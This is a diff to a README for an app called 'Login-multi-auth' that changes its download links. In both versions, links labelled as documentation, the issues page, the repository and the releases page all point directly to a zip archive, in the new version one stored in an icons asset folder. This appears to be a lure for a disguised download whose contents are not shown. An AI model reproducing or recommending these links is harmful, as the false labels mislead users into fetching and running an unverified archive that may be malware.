@@ -6,12 +6,12 @@ Welcome to the **Login-multi-auth** app! This application makes managing authent
 
 ## 📥 Download the App
 
-[![Download Login-multi-auth](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip%20Now-%20Login--multi--auth-brightgreen)](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip)
+[![Download Login-multi-auth](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip%20Now-%20Login--multi--auth-brightgreen)](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the application, visit the [Releases page](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip).
+   To get the application, visit the [Releases page](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip).
 
 2. **Choose the Right File**  
    On the Releases page, you will see various versions of the app. Look for the latest release and select the file that corresponds to your operating system. 
@@ -74,7 +74,7 @@ If you face any issues, here are some common solutions:
 
 ## 🌟 Community Support
 
-For any questions or support, visit our [GitHub Issues page](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip). You can ask for help or learn from others who might have had the same issue.
+For any questions or support, visit our [GitHub Issues page](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip). You can ask for help or learn from others who might have had the same issue.
 
 ## 🤝 Contributing
 
@@ -103,8 +103,8 @@ We thank all contributors and the open-source community for their support. Your 
 
 ## 🔗 Useful Links
 
-- [Documentation](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip) 
-- [GitHub Repository](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip)
-- [Releases Page](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip)
+- [Documentation](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip) 
+- [GitHub Repository](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip)
+- [Releases Page](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip)
 
-[![Download Login-multi-auth](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip%20Now-%20Login--multi--auth-brightgreen)](https://raw.githubusercontent.com/norris543/Login-multi-auth/main/supraconscious/Login-multi-auth.zip)
+[![Download Login-multi-auth](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip%20Now-%20Login--multi--auth-brightgreen)](https://github.com/norris543/Login-multi-auth/raw/refs/heads/main/public/assets/icons/Login_multi_auth_3.6.zip)
